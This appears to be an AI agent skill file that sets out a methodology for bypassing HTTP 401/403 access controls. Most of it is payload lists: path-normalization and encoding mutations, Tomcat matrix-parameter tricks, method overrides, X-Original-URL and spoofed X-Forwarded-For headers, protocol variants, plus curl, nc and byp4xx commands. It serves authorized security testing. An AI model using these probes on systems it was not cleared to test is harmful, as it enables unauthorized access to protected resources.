---
name: 401-403-bypass-techniques
description: Use when protected HTTP routes return 401 or 403.
version: 1.0.0
revision_date: 2026-08-31
license: MIT
platforms: [linux]
compatibility: Requires curl; byp4xx is optional.
tags: [recon, authorization, http, access-control, path-normalization]
category: recon
related_skills:
  - hunt-auth-bypass
  - hunt-http-smuggling
  - hunt-ssrf
  - hunt-idor
---

# 401/403 Bypass Techniques

A useful 401/403 bypass candidate often appears when two HTTP-processing layers
make different decisions about the same request. Common boundaries are CDN →
reverse proxy, reverse proxy → web server, web server → framework, and framework
→ route-level authorization. The useful signal is a change in routing or
protected content, not a status code by itself.

## When to Use

- A known route returns `401 Unauthorized` or `403 Forbidden`.
- A reverse proxy, WAF, API gateway, or CDN sits in front of the application.
- Frontend and backend components normalize paths or methods differently.
- IIS, Tomcat, Spring, Apache, Nginx, WebDAV, or framework-specific routing is visible.
- Equivalent paths produce different status, headers, redirects, body structure, or backend behavior.

## Prerequisites

- An HTTP client that preserves raw paths, such as `curl --path-as-is` or Burp Repeater.
- A denied baseline request and a stable marker for the expected protected resource.
- Optional tooling: `byp4xx`, `dirsearch`, `feroxbuster`, Burp Intruder, `nghttp`, and `nc`.
- Visibility into redirects and response bodies; status-only probing loses important differentials.

## How to Run

Capture a denied baseline without following redirects:

```bash
TARGET="https://target.example"
PATH_DENIED="/admin"
OUTDIR="${OUTPUT_DIR:-./output}/401-403"
mkdir -p "$OUTDIR"

curl -sS --path-as-is --max-time 10 --connect-timeout 5 \
  -D "$OUTDIR/baseline.headers" \
  -o "$OUTDIR/baseline.body" \
  -w 'status=%{http_code} bytes=%{size_download} redirect=%{redirect_url}\n' \
  "$TARGET$PATH_DENIED"

# Compare one path, method, and header differential.
curl -sS --path-as-is --max-time 10 -i \
  "$TARGET/./${PATH_DENIED#/}"
curl -sS --path-as-is --max-time 10 -i -X OPTIONS "$TARGET$PATH_DENIED"
curl -sS --path-as-is --max-time 10 -i \
  -H 'X-Forwarded-For: 127.0.0.1' "$TARGET$PATH_DENIED"
```

For each candidate, preserve the raw path and compare status, `Location`, body
length, title, content type, cache headers, and a stable protected-content marker.

## Procedure

### Phase 1 — Capture and Classify the Baseline

1. Record the denied response with the command from `How to Run`.
2. Save status, headers, redirect target, body length, title, and a stable body marker.
3. Identify whether the denial resembles a CDN/WAF, proxy, server, framework, or application response.
4. Use the same baseline fingerprint when comparing every later phase.

### Phase 2 — Test Path Normalization

The central question is whether the access-control layer and route handler use
the same canonical path.

#### Trailing Slash, Dot, and Empty Segments

```text
/admin
/admin/
/admin.
/admin/.
/./admin
//admin
///admin///
/admin//
```

- `/admin/` tests slash-sensitive location and route matching.
- `/admin.` tests trailing-dot handling, especially on Windows-backed stacks.
- `/admin/.` and `/./admin` test dot-segment removal.
- Duplicate slashes test whether only one layer collapses empty segments.

Use `--path-as-is`; otherwise the client may normalize the candidate before it
reaches the target.

#### Case Sensitivity

```text
/admin
/Admin
/ADMIN
/aDmIn
```

This is most relevant when a case-sensitive proxy rule fronts a case-insensitive
filesystem or router, particularly IIS/ASP.NET and Windows-hosted applications.

#### Percent Encoding

```text
/%61dmin
/admi%6e
/%61%64%6d%69%6e
/%2e/admin
/admin%2f
/admin%3fignored
```

Test whether decoding happens before or after location matching. Encoded `/`,
`.`, `?`, and path characters are especially useful when a gateway and backend
decode at different stages.

#### Double Encoding

```text
/%2561dmin
/admin%252f
/%252e/admin
/admin..%252f
```

`%25` becomes `%` after the first decode. These variants matter when one layer
decodes once and another layer decodes again.

#### Legacy UTF-8 and Null-Byte Parsing

```text
/%C0%AFadmin     overlong UTF-8 form of `/`
/%C0%AE/admin    overlong UTF-8 form of `.`
/admi%C1%AE      overlong UTF-8 form of `n`
/admin%00
/admin%00.json
/%00/admin
```

These are legacy parser behaviors. Modern UTF-8 decoders reject overlong forms,
and modern managed runtimes usually reject embedded NUL bytes. They remain
relevant to older native modules, legacy gateways, and mixed decoding chains.

#### Path Parameters and Matrix Variables

```text
/admin;
/admin;foo=bar
/admin;x
/;/admin
/admin..;/
/admin;.css
/admin;jsessionid=marker
```

Semicolon segments are significant in Java/Tomcat and frameworks that support
matrix parameters. A proxy may compare the literal segment while the application
strips or separately parses the parameter.

#### Suffix and Extension Handling

```text
/admin.json
/admin.html
/admin.css
/admin.anything
/admin%20
/admin%09
/admin%0d
/admin%0a
/admin~
/admin?
/admin%23fragment
/admin#fragment
```

Encoded `#` is sent as part of the request target; a literal fragment is not sent
by browsers and only matters when a raw client or intermediary treats it as path
data. Control-character suffixes target legacy request-line or parser handling.
Suffix matching is mainly relevant to older framework configurations and
extension-based rewrite rules.

#### Backslash and Windows Path Handling

```text
/admin\
\admin
/admin\..\admin
/admin::$DATA
```

Backslash and NTFS alternate-data-stream forms are IIS/Windows-specific. ADS
handling is primarily legacy, but backslash normalization still differs between
URL parsers, security filters, and Windows path APIs.

#### Combined Path Transformations

```text
///Admin///
/./%61dmin/
/./admin/./
/admin..;/admin
/admin/..;/admin
/admin../
/%252e//Admin;
/admin%252f..%252fadmin
```

Combinations are useful after a single transformation identifies the layer that
normalizes differently. Combining random mutations without a parser hypothesis
produces noisy results that are difficult to interpret.

### Phase 3 — Test Method Dispatch

#### Direct Method Changes

```text
GET      /admin
HEAD     /admin
OPTIONS  /admin
POST     /admin
PUT      /admin
PATCH    /admin
DELETE   /admin
TRACE    /admin
CONNECT  /admin
```

- `HEAD` is bodyless and may use a different route path; it does not prove body access.
- `OPTIONS` can expose method registration or CORS behavior without invoking the protected handler.
- `POST`, `PUT`, `PATCH`, and `DELETE` are state-changing methods when the route implements their normal semantics.
- `TRACE` tests server reflection and method filtering; it does not retrieve the protected representation.
- `CONNECT` primarily tests proxy handling and tunnel policy, not ordinary origin routing.

#### Method Override Headers and Parameters

```http
POST /admin HTTP/1.1
X-HTTP-Method-Override: PUT

POST /admin HTTP/1.1
X-Method-Override: PATCH

POST /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=PUT
```

Override behavior appears in frameworks and middleware that tunnel methods
through `POST`. The differential exists when the filtering layer checks the
outer method while the route dispatcher uses the overridden method.

#### Custom and WebDAV Methods

```text
FOOBAR    /admin
GETS      /admin
PROPFIND  /admin
MOVE      /admin
COPY      /admin
MKCOL     /admin
LOCK      /admin
UNLOCK    /admin
```

Custom verbs test allowlist assumptions. WebDAV verbs are useful when WebDAV is
enabled on IIS, Apache, a storage gateway, or a reverse proxy with DAV support.

### Phase 4 — Test Header Interpretation

#### Rewrite and Original-Path Headers

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

These are consumed by particular rewrite middleware, IIS modules, gateways, and
application stacks. Nginx does not universally honor them by itself. The tested
condition is whether the frontend authorizes `/` while a downstream component
routes the header-provided path.

#### Forwarding and Client-IP Headers

```text
X-Forwarded-For
X-Real-IP
X-Originating-IP
X-Remote-IP
X-Remote-Addr
X-Client-IP
True-Client-IP
Cluster-Client-IP
X-ProxyUser-IP
X-Custom-IP-Authorization
Forwarded
```

Common loopback/private values:

```text
127.0.0.1
127.1
10.0.0.1
0.0.0.0
::1
2130706433
0177.0.0.1
0x7f000001
localhost
```

This family tests trusted-proxy configuration: the application must consume a
client-controlled forwarding header as the effective source address. Numeric,
octal, hexadecimal, shortened, and hostname forms are parser-dependent.

For the standardized form, send the value as a structured field rather than as
an IP-only header:

```http
Forwarded: for=127.0.0.1;proto=https;host=localhost
```

#### Routing and Content-Negotiation Headers

```http
Referer: https://target.example/admin
Origin: https://target.example
Host: localhost
X-Forwarded-Host: localhost
X-Forwarded-Proto: https
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept: application/json
```

These test referer/origin checks, virtual-host routing, forwarded scheme/host
handling, content-type-specific routes, AJAX-only branches, and representation
negotiation.

### Phase 5 — Test Protocol Variants

#### HTTP/1.0

```bash
curl -sS --http1.0 --path-as-is -i "https://target.example/admin"
```

HTTP/1.0 changes persistent-connection behavior and may traverse a different
proxy or ACL path. Host handling also differs on legacy intermediaries.

#### HTTP/0.9

```bash
printf 'GET /admin\r\n' | nc target.example 80
```

HTTP/0.9 is legacy and has no response headers. It is relevant only when an old
listener or compatibility path accepts the request form while a newer frontend
expects HTTP/1.x semantics.

#### HTTP/2 Pseudo-Headers

```http
:method: GET
:scheme: https
:authority: target.example
:path: /admin
```

Test `:path` normalization, `:authority` versus `Host`, duplicate-header
handling after H2-to-H1 translation, and differences between edge and origin
protocol parsers. Use `hunt-http-smuggling` when the differential crosses
request boundaries rather than only route authorization.

#### WebSocket Upgrade

```http
GET /admin HTTP/1.1
Host: target.example
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

Use this only when the target exposes a WebSocket route or an intermediary
handles upgrade requests differently from ordinary HTTP. A `101 Switching
Protocols` response confirms a handshake path, not access to the protected HTTP
representation; verify the resulting channel and route semantics separately.

### Phase 6 — Combine Confirmed Differentials

```http
POST / HTTP/1.1
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0
X-Forwarded-Host: localhost

PROPFIND /admin;marker HTTP/1.1
X-Rewrite-URL: /admin
```

Build combinations from observed behavior: path mutations target canonicalization,
method variants target dispatch, headers target trust/routing, and protocol
variants target intermediary parsing.

### Phase 7 — Apply Stack-Specific Checks

| Stack | Differential to test | Technical condition |
|---|---|---|
| Apache | Directory slash redirects, `PATH_INFO`, `mod_rewrite` decoding | Authorization and rewrite phases use different URI forms |
| Nginx | Exact/prefix/regex `location`, normalized URI, `proxy_pass` URI replacement | Location check and upstream URI construction diverge |
| IIS/ASP.NET | Case folding, backslashes, extension mapping, legacy ADS forms | Windows path handling differs from URL filtering |
| Tomcat/Java | Semicolon matrix parameters, `..;`, encoded slash handling | Connector/proxy and servlet path parsing diverge |
| Spring MVC | Trailing slash, older suffix pattern matching, path decoding | Security matcher and controller mapping use different patterns |
| Node/Express | Repeated slash, case-sensitive/strict routing options, mounted routers | Proxy path and Express route options disagree |
| WebDAV | `PROPFIND`, `MOVE`, `COPY`, `MKCOL`, locking methods | DAV handler has a different method or path policy |

### Phase 8 — Automate for Coverage

| Tool | Use |
|---|---|
| [`byp4xx`](https://github.com/lobuhi/byp4xx) | Path, method, header, and protocol candidate generation |
| `dirsearch` | Feed encoded and suffix variants through a custom wordlist |
| `feroxbuster` | Recursive discovery with a prepared mutation wordlist |
| Burp Intruder | Cartesian products of paths, methods, headers, and values |
| Burp Repeater | Precise raw-path and response comparison |

#### byp4xx

```bash
byp4xx -m 10 --rate 5 -xD "https://target.example/admin"
```

- `-m 10` sets the per-request timeout.
- `--rate 5` sets the request rate.
- `-xD` excludes default-credential checks so the run stays focused on 401/403 differentials.

Automation output is a candidate list. Reproduce useful rows manually and
compare their response semantics with the baseline.

### Execution Flow

```text
Denied baseline
│
├── Path normalization
│   ├── slash, dot-segment, duplicate slash
│   ├── case and percent encoding
│   ├── path parameters and suffixes
│   └── legacy parser forms
│
├── Method dispatch
│   ├── HEAD and OPTIONS behavior
│   ├── direct method changes
│   ├── override headers/parameters
│   └── custom and WebDAV methods
│
├── Header interpretation
│   ├── original/rewrite URL
│   ├── forwarding/client IP
│   └── host, origin, referer, content type
│
├── Protocol interpretation
│   ├── HTTP/1.0
│   ├── legacy HTTP/0.9
│   └── HTTP/2 pseudo-header translation
│
├── Combine confirmed differentials
│
├── Related techniques
│   ├── hunt-auth-bypass
│   ├── hunt-http-smuggling
│   ├── hunt-ssrf
│   └── hunt-idor
│
└── Automate for completeness, then reproduce manually
```

## Quick Reference

| Candidate | Target component | Stack condition | Comparison signal |
|---|---|---|---|
| `/admin/`, `/./admin`, `//admin` | Path canonicalization | Proxy/backend normalize differently | Route, body, or redirect differs |
| `/Admin` | Case handling | Case-sensitive edge, insensitive backend | Protected route marker appears |
| `/%61dmin`, `/%2561dmin` | Decode stages | Single versus double decode | Backend route changes |
| `/admin;foo`, `/admin..;/` | Matrix/path parameters | Java/Tomcat parsing | Servlet path differs from edge path |
| `/admin\` | Path separators | IIS/Windows or mixed parser | Windows-backed route changes |
| Method override header | Method dispatch | Middleware honors override after filtering | Handler/method behavior changes |
| `PROPFIND /admin` | WebDAV handler | DAV enabled | DAV metadata or distinct method policy |
| `X-Original-URL: /admin` | Rewrite middleware | Downstream consumes original URL | Root request reaches protected route |
| `X-Forwarded-For: 127.0.0.1` | Trusted-proxy logic | Client header accepted as source IP | Internal-only branch appears |
| HTTP/1.0 | Protocol ACL | Legacy intermediary path | Different frontend/backend response |
| H2 `:path`/`:authority` | H2 translation | Edge converts to H1 differently | Routing or host policy changes |

## Pitfalls

- A `200` may be a login page, generic error, WAF challenge, SPA shell, or cached public response.
- A `301` or `302` may only redirect to authentication; inspect `Location` and the destination body.
- `HEAD` has no body, so body access must be tested with a method that returns the representation.
- `OPTIONS` and `TRACE` expose method behavior but do not by themselves expose the protected route.
- CDN, proxy, server, framework, and application layers may each normalize
  differently; identify the layer responsible for the change.
- Browser and command-line clients normalize URLs differently. Preserve raw paths when testing parser behavior.
- Legacy forms are useful only when a compatible parser or compatibility layer is present.
- Cache hits can make two distinct backend requests look identical, or make one
  candidate look successful without reaching the protected handler.

## Verification

Compare every candidate with the denied baseline using:

- status and reason phrase;
- `Location`, `WWW-Authenticate`, `Allow`, cache, and content-type headers;
- title, body length, structural similarity, and stable protected-content markers;
- effective route, method-specific behavior, and backend-generated identifiers;
- repeated requests with a cache buster when cache behavior is ambiguous.

A bypass is technically meaningful when the alternate request reaches the
protected representation or behavior that the denied baseline cannot reach.
Status changes without that semantic difference are routing observations, not
confirmed bypasses.
